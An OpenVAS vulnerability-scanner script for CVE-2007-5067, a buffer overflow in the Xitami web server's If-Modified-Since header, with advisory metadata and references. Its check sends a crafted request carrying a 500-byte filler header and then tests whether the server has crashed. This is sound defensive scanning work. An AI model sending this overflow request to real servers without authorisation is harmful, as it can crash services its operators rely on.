###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xitami_web_server_if_modified_since_bof_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Xitami Web Server If-Modified-Since Buffer Overflow Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let the remote unauthenticated attackers to
  execute arbitrary code on the system or cause the application to crash.
  Impact Level: Application";
tag_affected = "iMatix Xitami Web Server Version 2.5c2 and 2.5b4, Other versions may also
  be affected.";
tag_insight = "The flaw is caused the way xitami web server handles 'If-Modified-Since'
  header. which can be exploited to cause a buffer overflow by sending a
  specially-crafted parameter to 'If-Modified-Since' header.";
tag_solution = "No solution or patch is available as of 9th June, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.xitami.com/";
tag_summary = "This host is running Xitami Web Server and is prone to buffer overflow
  vulnerability.";

if(description)
{
  script_id(802025);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)");
  script_bugtraq_id(25772);
  script_cve_id("CVE-2007-5067");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Xitami Web Server If-Modified-Since Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/40594");
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/40595");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/26884/");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/36756");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/4450");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17361");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17359");

  script_description(desc);
  script_summary("Check xitami web server is vulnerable by sending crafted packets");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Get Host Name or IP
host = get_host_name();
if(!host){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if("Server: Xitami" >!< banner) {
  exit(0);
}

## Construct POST Request with crafted "if-Modified-Since" header
craftedReq = string("GET / HTTP/1.1\r\n", "Host: ", host, "\r\n",
             "User-Agent: Xitami plugin BOF Test\r\n",
             "If-Modified-Since: ! ", crap(data:'A', length:500),
             "\r\n\r\n");

## Send crafted data to server
res = http_keepalive_send_recv(port:port, data:craftedReq);

## Sleep for a sec
sleep(1);

## Check still server is alive or not, If not then
## server is died and it's vulnerable
req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req);
if("Server: Xitami" >!< res) {
  security_hole(port);
}
